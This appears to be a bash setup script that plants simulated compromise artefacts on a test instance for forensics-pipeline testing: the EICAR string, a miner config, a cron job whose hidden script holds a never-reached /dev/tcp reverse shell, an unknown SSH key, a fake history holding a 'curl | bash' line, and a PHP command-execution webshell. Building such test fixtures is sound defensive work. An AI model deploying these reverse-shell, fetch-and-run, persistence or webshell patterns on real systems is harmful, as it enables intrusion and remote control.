#!/bin/bash
# Demo "compromised" instance for testing the forensics pipeline end to end.
# Everything planted here is INERT: nothing is executed, no network connection is
# made, and 203.0.113.0/24 / example.invalid are reserved documentation addresses.
set -eux

# 1. EICAR anti-malware test file (built from two halves so this script itself is not flagged)
mkdir -p /tmp/.cache
printf '%s%s' 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR' '-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > /tmp/.cache/update.com

# 2. Fake crypto-miner config dropped in a hidden tmp directory
mkdir -p /var/tmp/.x11
cat > /var/tmp/.x11/config.json <<'EOF'
{
  "autosave": true,
  "donate-level": 1,
  "cpu": { "enabled": true, "huge-pages": true },
  "randomx": { "mode": "fast" },
  "pools": [ { "url": "stratum+tcp://pool.example.invalid:3333", "user": "WALLET_PLACEHOLDER", "pass": "x" } ],
  "comment": "xmrig style configuration planted for forensic testing only"
}
EOF

# 3. Persistence: a cron job pointing at a hidden script containing a reverse shell pattern.
#    The script exits before doing anything.
cat > /usr/local/bin/.sysupdate <<'EOF'
#!/bin/bash
exit 0
# simulated attacker payload (never reached):
bash -i >& /dev/tcp/203.0.113.10/4444 0>&1
EOF
chmod 755 /usr/local/bin/.sysupdate
echo '*/30 * * * * root /usr/local/bin/.sysupdate >/dev/null 2>&1' > /etc/cron.d/sysupdate

# 4. Unknown SSH key added to ec2-user
mkdir -p /home/ec2-user/.ssh
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFakeKeyForForensicsTestingOnly0000000000000 attacker@203.0.113.10' >> /home/ec2-user/.ssh/authorized_keys
chown -R ec2-user:ec2-user /home/ec2-user/.ssh
chmod 600 /home/ec2-user/.ssh/authorized_keys

# 5. Shell history that looks like hands-on-keyboard activity
cat >> /root/.bash_history <<'EOF'
whoami
curl -s http://203.0.113.10/x.sh | bash
chattr +i /usr/local/bin/.sysupdate
history -c
EOF

# 6. Second EBS volume (data disk) with a planted PHP webshell, to show multi-volume handling
for _ in $(seq 1 60); do
  DATA_DEV=$(lsblk -dnpo NAME,SERIAL | awk '$2 ~ /^vol/ {print $1}' | grep -v "$(findmnt -no SOURCE / | sed 's/p[0-9]*$//')" | head -1 || true)
  [ -n "$DATA_DEV" ] && break
  sleep 5
done
if [ -n "${DATA_DEV:-}" ]; then
  if ! blkid "$DATA_DEV"; then mkfs.xfs -f "$DATA_DEV"; fi
  mkdir -p /srv/www
  mount "$DATA_DEV" /srv/www
  mkdir -p /srv/www/uploads
  echo '<?php if(isset($_REQUEST["c"])){ system($_REQUEST["c"]); } ?>' > /srv/www/uploads/thumb.php
  echo "$DATA_DEV /srv/www xfs defaults,nofail 0 2" >> /etc/fstab
fi
sync
